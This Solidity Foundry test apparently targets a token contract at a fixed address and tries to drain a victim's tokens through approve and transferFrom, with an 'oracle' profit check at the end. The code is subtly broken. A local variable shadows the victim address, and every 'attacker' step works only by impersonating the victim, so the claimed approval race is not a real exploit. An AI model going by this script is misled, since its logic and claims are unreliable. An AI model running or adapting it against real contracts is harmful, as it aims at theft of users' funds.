// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface Touch {
    function approve(address _spender, uint256 _value) external returns (bool);
    function allowance(address _owner, address _spender) external view returns (uint256);
    function transferFrom(address _from, address _to, uint256 _value) external returns (bool);
    function balanceOf(address _owner) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x5e0aF01930c8dc676a6Dc7133Bd86370a0bE3953;
    address attacker = address(this);
    address victim;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Create victim address
        address victim = address(0x123);

        // Give attacker initial TST balance (they need some to call approve)
        deal(TARGET, attacker, 1 ether);

        // Give victim substantial TST balance
        deal(TARGET, victim, 1000 ether);

        // Label addresses for debugging
        vm.label(victim, "Victim");
        vm.label(attacker, "Attacker");
        vm.label(TARGET, "TST Token");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0x5e0aF01930c8dc676a6Dc7133Bd86370a0bE3953).balanceOf(address(this));
        // Step 1: Attacker approves themselves for a small amount from victim's perspective
        // We need to impersonate victim to call approve
        vm.startPrank(victim);
        Touch(TARGET).approve(attacker, 1);
        vm.stopPrank();

        // Verify the small approval was set
        uint256 allowanceAfterSmall = Touch(TARGET).allowance(victim, attacker);
        require(allowanceAfterSmall == 1, "Small approval should be 1");

        // Step 2: Now victim tries to approve a larger amount (this should fail)
        vm.startPrank(victim);
        // This will revert because allowance is already non-zero (1) and value is not zero
        bool success;
        bytes memory data;
        (success, data) = address(TARGET).call(
            abi.encodeWithSignature("approve(address,uint256)", attacker, 1000 ether)
        );
        vm.stopPrank();

        // The call should fail (revert)
        require(!success, "Victim's approval should fail due to race condition");

        // Step 3: Attacker resets approval to zero (impersonating victim)
        vm.startPrank(victim);
        Touch(TARGET).approve(attacker, 0);
        vm.stopPrank();

        // Step 4: Now attacker approves themselves for victim's entire balance
        vm.startPrank(victim);
        Touch(TARGET).approve(attacker, 1000 ether);
        vm.stopPrank();

        // Verify the large approval was set
        uint256 allowanceAfterLarge = Touch(TARGET).allowance(victim, attacker);
        require(allowanceAfterLarge == 1000 ether, "Large approval should be set");

        // Step 5: Attacker steals victim's tokens using transferFrom
        uint256 attackerBalanceBefore = Touch(TARGET).balanceOf(attacker);
        Touch(TARGET).transferFrom(victim, attacker, 1000 ether);
        uint256 attackerBalanceAfter = Touch(TARGET).balanceOf(attacker);

        // Verify attacker's balance increased
        require(attackerBalanceAfter > attackerBalanceBefore, "Attacker balance should increase");

        // Final check for oracle
        uint256 victimBalance = Touch(TARGET).balanceOf(victim);
        require(victimBalance == 0, "Victim should have no tokens left");
        uint256 finalBalance = IERC20(0x5e0aF01930c8dc676a6Dc7133Bd86370a0bE3953).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
